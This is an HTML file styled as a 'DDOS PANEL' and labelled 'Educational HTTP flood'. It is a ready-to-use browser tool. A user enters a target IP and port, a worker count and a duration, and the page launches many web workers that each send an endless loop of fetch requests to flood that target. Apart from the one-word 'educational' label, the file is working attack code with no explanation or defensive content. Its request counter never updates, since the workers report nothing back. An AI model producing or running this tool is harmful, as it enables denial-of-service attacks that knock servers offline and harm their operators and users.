<!-- super_strong_ddos.html -->
<!-- Educational HTTP flood with accurate status display -->
<!-- Open in browser, enter target IP:port, start attack, see live stats -->
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Super Strong DDoS</title>
<style>
  body { font-family: monospace; background: #000; color: #0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
  .panel { background: #111; border: 2px solid #0f0; padding: 20px; border-radius: 10px; }
  input { background: #222; border: 1px solid #0f0; color: #0f0; padding: 5px; margin: 5px; }
  button { background: #0a0; border: none; color: #000; padding: 10px; cursor: pointer; font-weight: bold; }
  button:hover { background: #0f0; }
  #log { height: 200px; overflow-y: auto; background: #000; border: 1px solid #0f0; padding: 5px; margin-top: 10px; }
</style>
</head>
<body>
<div class="panel">
  <h1>DDOS PANEL</h1>
  <label>Target IP:Port</label><br>
  <input type="text" id="target" value="127.0.0.1:80"><br>
  <label>Threads (workers):</label><br>
  <input type="number" id="threads" value="100" min="1"><br>
  <label>Duration (seconds):</label><br>
  <input type="number" id="duration" value="30"><br>
  <button id="startBtn">START ATTACK</button> <button id="stopBtn" disabled>STOP</button>
  <div id="stats">Ready</div>
  <div id="log"></div>
</div>
<script>
  let workers = [];
  let startTime, endTime, totalRequests = 0, stopped = false;
  const target = document.getElementById('target');
  const threads = document.getElementById('threads');
  const duration = document.getElementById('duration');
  const logDiv = document.getElementById('log');
  const statsDiv = document.getElementById('stats');
  const startBtn = document.getElementById('startBtn');
  const stopBtn = document.getElementById('stopBtn');

  function log(msg) {
    const div = document.createElement('div');
    div.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logDiv.appendChild(div);
    logDiv.scrollTop = logDiv.scrollHeight;
  }

  function updateStats() {
    const elapsed = (Date.now() - startTime) / 1000;
    statsDiv.textContent = `Threads: ${workers.length} | Elapsed: ${elapsed.toFixed(1)}s | Requests sent: ${totalRequests}`;
  }

  function floodWorker(targetUrl) {
    return function() {
      while (!stopped) {
        try {
          const xhr = new XMLHttpRequest();
          xhr.open('GET', targetUrl, true);
          xhr.send();
          totalRequests++;
        } catch(e) {}
      }
    };
  }

  function startAttack() {
    if (workers.length) stopAttack();
    const tgt = target.value.trim();
    if (!tgt) return log('Please enter a target IP:port');
    const url = `http://${tgt}/`;
    const workerCount = parseInt(threads.value) || 100;
    const dur = parseInt(duration.value) || 30;
    stopped = false;
    totalRequests = 0;
    startTime = Date.now();
    log(`Starting attack on ${url} with ${workerCount} workers for ${dur}s`);
    startBtn.disabled = true;
    stopBtn.disabled = false;

    // Create web workers for more parallel load
    const blob = new Blob([`onmessage = function(e) { while(true) { fetch(e.data); } }`], {type: 'application/javascript'});
    const workerUrl = URL.createObjectURL(blob);
    for (let i = 0; i < workerCount; i++) {
      const worker = new Worker(workerUrl);
      worker.postMessage(url);
      workers.push(worker);
    }

    const statsInterval = setInterval(updateStats, 500);
    setTimeout(() => {
      stopAttack();
      clearInterval(statsInterval);
      log('Attack finished automatically.');
      updateStats();
    }, dur * 1000);
  }

  function stopAttack() {
    stopped = true;
    workers.forEach(w => w.terminate());
    workers = [];
    startBtn.disabled = false;
    stopBtn.disabled = true;
    log('Attack stopped manually.');
  }

  startBtn.onclick = startAttack;
  stopBtn.onclick = stopAttack;
</script>
</body>
</html>
